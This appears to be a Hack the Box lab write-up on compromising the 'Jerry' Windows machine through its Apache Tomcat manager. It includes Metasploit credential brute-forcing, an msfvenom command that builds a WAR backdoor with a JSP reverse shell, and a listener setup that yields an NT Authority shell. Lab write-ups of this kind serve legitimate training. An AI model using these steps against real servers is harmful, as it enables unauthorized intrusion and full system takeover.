# Machine: Jerry

## Overview

This write-up details my approach to compromising the "Jerry" machine on Hack the Box. The Jerry machine is a Windows Server 2012 R2 system running an Apache Tomcat server. Below are the steps I followed to successfully exploit the machine and obtain the necessary flags.

## Enumeration

Nmap Scan Results:

```bash
nmap -sV -sC -p8080 <IP> -oN jerry_nmap_scan.txt
```

The scan revealed the following open port:

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```

## Exploitation

Using Metasploit to Find Tomcat Admin Credentials:

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
run
```

This module helped identify valid Tomcat manager credentials.

### Accessing Tomcat Manager:

I logged into the Tomcat Manager at http://jerry.htb:8080/manager/html using the discovered credentials. The manager page allows the deployment of WAR files.

### Creating a WAR Backdoor:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<MY IP> LPORT=80 -f war -o revshell.war
```

I verified the contents of the WAR file:

```bash
jar -xvf revshell.war
```

### Setting up a Multi/Handler Listener:

In Metasploit:

```bash
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <MY IP>
set LPORT 80
run
```

### Deploying the WAR Backdoor:

I uploaded revshell.war via the Tomcat Manager interface and accessed the deployed backdoor at http://jerry.htb:8080/revshell/fqsyuctsb.jsp. This provided a reverse shell with NT Authority privileges.

## Post-Exploitation

### Privilege Escalation:

Upon obtaining the reverse shell, I had NT Authority privileges, which is the highest privilege level on a Windows machine.

## Flag Capture:

Located and captured the user and root flags.

## Conclusion

Compromising the Jerry machine involved identifying an open port running Apache Tomcat, discovering valid credentials for the Tomcat manager, deploying a WAR backdoor, and obtaining a reverse shell. This exercise reinforced key concepts in web server exploitation and privilege escalation on Windows systems.

***
